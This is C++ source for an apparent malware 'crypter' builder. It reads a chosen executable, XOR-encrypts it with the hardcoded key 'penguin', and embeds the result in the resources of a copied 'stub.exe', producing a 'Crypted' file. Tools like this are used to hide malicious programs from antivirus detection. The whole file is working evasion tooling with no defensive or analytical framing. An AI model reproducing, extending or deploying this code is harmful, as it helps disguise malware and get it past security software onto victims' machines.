#pragma warning (disable:4996)
#include <iostream>
#include <Windows.h>
#include <fstream>
#include <vector>
#include <string>
using namespace std;

char* FB; //The Buffer that will store the File's data
DWORD fs; // We will store the File size here
wchar_t output[MAX_PATH];
char choice;
DWORD dwBytesWritten = 0;
char name[MAX_PATH];   // We will store the Name of the Crypted file here

std::vector<char> file_data;  // With your current program, make this a global.

void RDF() //The Function that Reads the File and Copies the stub
{
	DWORD bt;

	cout << "Please enter the Path of the file \nIf the file is in the same folder as the builder\nJust type the file name with an extention\nEG: Stuff.exe\n";
	cout << "File Name: ";
	cin >> name; // Ask for input from the user and store that inputed value in the name variable
	cout << "Enter output name: ";
	wcin >> output;
	CopyFile(L"stub.exe", output/*L"Crypted.exe"*/, 0);// Copy stub , so we done need to download a new one each time we crypt
	// ofcourse we can just update the resources with new data but whatever
	cout << "\nGetting the HANDLE of the file to be crypted\n";
	HANDLE efile = CreateFileA(name, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//^ Get the handle of the file to be crypted
	cout << "Getting the File size\n";
	fs = GetFileSize(efile, NULL);
	//Get its size , will need to use it for the encryption and buffer that will store that Data allocation
	cout << "The File Size is: ";
	cout << fs;
	cout << " Bytes\n";
	cout << "Allocating Memory for the ReadFile function\n";
	file_data.resize(fs);  // set vector length equal to file size
	cout << "Reading the file\n";
	//ReadFile(efile, FB, fs, &bt, NULL);//Read the file (put the files data in to a FB buffer)

	ReadFile(efile, (LPVOID)(file_data.data()), fs, &bt, NULL);

	CloseHandle(efile);//close the handle

	if (fs != bt)
		cout << "Error reading file!" << endl;
}

void xor_crypt(const std::string& key, std::vector<char>& data)
{
	for (size_t i = 0; i != data.size(); i++)
		data[i] ^= key[i % key.size()];

	/*ofstream out("After_enc.dat");
	for (std::vector<char>::const_iterator it = data.begin(), itEnd = data.end(); it != itEnd; ++it)
		out << *it;*/
}

void choose_enc()
{
	//Asks users for encryption method
	cout << "\n\nChoose encryption method: " << endl;
	cout << "1. N/A" << endl;
	cout << "2. Simple XOR" << endl;
	cin >> choice;
}

void enc() // The function that Encrypts the info on the FB buffer
{
	cout << "Encrypting the Data\n";

	switch (choice)
	{
	case '1':
		break;
	case '2':
	{
		/*ofstream myfile("2.dat");
		for (std::vector<char>::const_iterator it = file_data.begin(), itEnd = file_data.end(); it != itEnd; ++it)
			myfile << *it;*/
		xor_crypt("penguin", file_data); //Encrypt it

	}
	break;
	return;
	}
}

void WriteToResources(LPTSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize) // Function that Writes Data to resources 
{
	cout << "Writing Encrypted data to stub's resources\n";
	HANDLE hResource = NULL;
	hResource = BeginUpdateResource(szTargetPE, FALSE);
	//LPVOID lpResLock = LockResource(lpBytes);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

int main() // The main function (Entry point)
{
	std::string key = "penguin";
	RDF(); //Read the file
	choose_enc();
	enc();
	file_data.push_back(choice);
	cout << fs << endl;
	WriteToResources(output, 10, (BYTE*)file_data.data(), file_data.size());
	cout << "Your File Got Crypted\n";
	system("PAUSE");
}
